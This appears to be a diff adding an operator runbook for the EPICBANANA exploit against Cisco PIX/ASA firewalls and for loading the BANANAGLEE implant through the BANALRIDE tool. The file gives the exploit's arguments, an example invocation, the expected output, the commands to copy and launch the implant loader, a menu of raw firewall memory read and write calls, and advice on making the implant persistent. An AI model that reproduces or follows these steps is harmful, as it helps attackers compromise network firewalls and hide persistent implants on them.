@@ -1,0 +1,81 @@
+# Make sure you have a 'sh ver' before attempting to throw
+# You will need hardware type (PIX or ASA) and if ASA then the memory size as well
+# Check to make sure that you have support for that Hardware and OS in the versions/ directory
+
+# Required Arguements
+-t TARGET_IP, --target_ip=TARGET_IP -- Either 127.0.0.1 or Win Ops IP
+--proto=PROTO         target protocol "telnet" or "ssh" (REQUIRED)
+--username=USERNAME   default = pix (optional)
+--password=PASSWORD   (REQUIRED)
+--target_vers=TARGET_VERS    target Pix version (pix712, asa804) (REQUIRED)
+--mem=MEMORY      target Pix memory size (64M, 1024M) (REQUIRED for pix, NA for ASA) - NEED to put NA for an ASA
+-p DEST_PORT, --dest_port=DEST_PORT defaults: telnet=23, ssh=22 (optional) - Change to LOCAL redirect port
+
+Example:
+./epicbanana_2.0.0.1.py -t 127.0.0.1 --proto=ssh --username=cisco --password=cisco --target_vers=asa804 --mem=NA -p 22 
+
+Expected Response:
+waiting for response from target
+received mtu - EPBA: ok, payload: ok
+
+You may also see this response:
+no status returned from target, could be an exploit failure, or this is a version where we don't expect a status return
+# Like it says this may or may not have worked...to test for sure attempt to connect via the BANALRIDE
+
+
+
+
+
+# Copy the BANALRIDE LP to the BANANAGLEE LP directory
+cp /current/bin/FW/epicbanana/bride-1100 /current/bin/FW/BGXXXX/Install/LP
+cd /current/bin/FW/BGXXXX/Install/LP
+./bride-1100 --lp 127.0.0.1 --implant 127.0.0.1 --sport RHP --dport RHP
+
+# BRIDE Menu:
+
+Session Commands
+----------------
+ 1) Open Session with firewall
+ 8) Display Menu
+ 9) Close Session with firewall
+ 0) Quit Program
+
+Raw API Calls
+-------------
+ 20) Read from firewall Memory
+ 21) Malloc Memory on firewall
+ 22) Free Malloc'd Memory on firewall
+ 23) Write to firewall Memory
+ 24) Get version of Firewall OS
+
+BananaGlee
+-------------
+ 30) Write BananaGlee to Memory
+
+# Open session with "1"
+# If you want you can triple check the OS before installing BG with "24"
+# Otherwise do "30" to install BG to memory
+
+BANAL RIDE# 30
+This will write the full BananaGlee implant
+to the memory of the target device ONLY.  Once
+this operation is complete, BananaGlee will
+be active.
+
+This operation will not write BananaGlee in
+a persistent manner.  In order to make it
+persistent across reboots, you MUST install
+JETPLOW or SCREAMINGPLOW.
+
+# Do you wish to continue? (y/n): y
+# Enter the path to the configured BG implant:			### Need to give it full path
+
+
+# What you want to see:
+# Successfully wrote BananaGlee to memory
+
+# You should now be able to connect to BG on that target like normal
+# Make sure you write a PLOW if you can with the same key
+
+
+
